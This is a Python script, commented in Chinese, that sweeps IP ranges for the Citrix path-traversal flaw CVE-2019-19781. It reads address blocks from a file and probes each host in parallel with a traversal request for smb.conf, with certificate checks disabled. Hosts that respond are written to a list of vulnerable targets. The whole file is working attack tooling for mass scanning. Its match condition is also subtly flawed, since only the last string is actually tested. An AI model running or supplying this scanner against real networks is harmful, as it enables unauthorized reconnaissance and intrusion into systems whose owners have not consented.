import requests
from IPy import IP
from multiprocessing import Pool

#給IP，測有沒有洞
def CVE(IP):
    try:
        req = requests.get("https://"+IP+"/vpn/../vpns/cfg/smb.conf", verify=False, timeout=2)
        if ("[global]") and ("encrypt passwords") and("name resolve order") in str(req.content):
            print("[OK]%s" % IP)
            f = open("CVE-2019-19781.txt",'a+')
            f.write("%s\n" % (IP))
            f.close()
    except:
        print("[NO]%s" % IP)

#給C class，拆解成各IP		
def networkdata(data):
    ip = IP(data) 
    box=[]
    for x in ip: 
        box.append(str(x))
    return box

#讀測試來源，格式為 192.168.1.0/24	
def opendata():
    with open('data.txt', 'r') as f:
        box = f.readlines()
    return box	

#GOGO跑起來，多線程
if __name__ == "__main__" :
    for j in opendata():
        p = Pool()
        for i in networkdata(j.strip('\n')):
            p.apply_async(CVE, args=(str(i),))
            #CVE(str(i))		
        p.close()
        p.join()
        print('-'*40)